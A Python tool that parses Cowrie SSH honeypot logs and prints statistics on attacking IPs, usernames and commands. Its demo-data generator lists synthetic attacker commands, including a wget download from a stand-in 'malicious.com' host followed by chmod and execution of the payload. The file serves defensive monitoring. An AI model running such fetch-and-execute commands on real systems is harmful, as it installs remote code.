import json
import argparse
from collections import Counter
from datetime import datetime
import os
import random
import sys
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

def generate_demo_data(num_events=500):
    """Generates synthetic Cowrie-like log data for demonstration."""
    event_ids = ["cowrie.session.connect", "cowrie.login.failed", "cowrie.login.success", "cowrie.command.input", "cowrie.session.closed"]
    ips = [f"192.168.1.{random.randint(2, 254)}" for _ in range(20)]
    usernames = ["root", "admin", "user", "oracle", "pi", "support"]
    passwords = ["123456", "password", "admin123", "root", "1234", "qwerty"]
    commands = ["uname -a", "ls -la", "cd /tmp", "wget http://malicious.com/payload.sh", "chmod +x payload.sh", "./payload.sh"]
    
    events = []
    for i in range(num_events):
        event_id = random.choice(event_ids)
        src_ip = random.choice(ips)
        timestamp = (datetime.now().replace(hour=random.randint(0, 23), minute=random.randint(0, 59))).isoformat() + "Z"
        session = f"s{random.randint(1000, 9999)}"
        
        event = {
            "eventid": event_id,
            "src_ip": src_ip,
            "timestamp": timestamp,
            "session": session
        }
        
        if event_id in ["cowrie.login.failed", "cowrie.login.success"]:
            event["username"] = random.choice(usernames)
            event["password"] = random.choice(passwords)
        elif event_id == "cowrie.command.input":
            event["input"] = random.choice(commands)
        
        events.append(event)
    return events

def analyze_logs(log_file, is_demo=False):
    if is_demo:
        data = generate_demo_data()
    else:
        if not os.path.exists(log_file):
            print(f"Error: {log_file} not found. Use --demo to generate sample data.")
            return None
        
        data = []
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line: continue
                try:
                    data.append(json.loads(line))
                except json.JSONDecodeError:
                    continue

    if not data:
        return None

    stats = {
        "total_events": len(data),
        "unique_ips": Counter(),
        "usernames": Counter(),
        "passwords": Counter(),
        "commands": Counter(),
        "hourly_dist": Counter(),
        "login_success": 0,
        "login_failed": 0,
        "connections": 0
    }

    for event in data:
        src_ip = event.get("src_ip", "Unknown")
        stats["unique_ips"][src_ip] += 1
        
        ts = event.get("timestamp")
        if ts:
            try:
                clean_ts = ts.replace("Z", "").split(".")[0]
                hour = datetime.fromisoformat(clean_ts).hour
                stats["hourly_dist"][hour] += 1
            except (ValueError, TypeError):
                pass
        
        eid = event.get("eventid", "")
        if eid == "cowrie.session.connect":
            stats["connections"] += 1
        elif eid == "cowrie.login.success":
            stats["login_success"] += 1
            stats["usernames"][event.get("username", "Unknown")] += 1
            stats["passwords"][event.get("password", "Unknown")] += 1
        elif eid == "cowrie.login.failed":
            stats["login_failed"] += 1
            stats["usernames"][event.get("username", "Unknown")] += 1
            stats["passwords"][event.get("password", "Unknown")] += 1
        elif eid == "cowrie.command.input":
            stats["commands"][event.get("input", "Unknown")] += 1

    return stats

def print_report(stats):
    if not stats:
        print("No data to report.")
        return

    report = []
    report.append("="*40)
    report.append("HONEYPOT SECURITY ANALYSIS REPORT")
    report.append("="*40)
    report.append(f"Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report.append(f"Total Events: {stats['total_events']}")
    report.append(f"Connections: {stats['connections']}")
    report.append(f"Login Attempts: {stats['login_success'] + stats['login_failed']} (Success: {stats['login_success']}, Failed: {stats['login_failed']})")
    report.append(f"Unique Attacking IPs: {len(stats['unique_ips'])}")
    
    report.append("\nTop 5 Attacking IPs:")
    for ip, count in stats['unique_ips'].most_common(5):
        report.append(f"  {ip}: {count}")
    
    report.append("\nTop 5 Usernames Used:")
    for user, count in stats['usernames'].most_common(5):
        report.append(f"  {user}: {count}")
        
    report.append("\nTop 5 Commands Executed:")
    for cmd, count in stats['commands'].most_common(5):
        report.append(f"  {cmd}: {count}")
        
    report_text = "\n".join(report)
    print(report_text)
    
    with open("honeypot_report.txt", "w", encoding='utf-8') as f:
        f.write(report_text)
    print("\nReport saved to honeypot_report.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Analyze Cowrie Honeypot Logs")
    parser.add_argument("--log", default="cowrie.json", help="Path to cowrie.json log file")
    parser.add_argument("--demo", action="store_true", help="Run in demo mode with synthetic data")
    args = parser.parse_args()
    
    analysis_stats = analyze_logs(args.log, args.demo)
    if analysis_stats:
        print_report(analysis_stats)
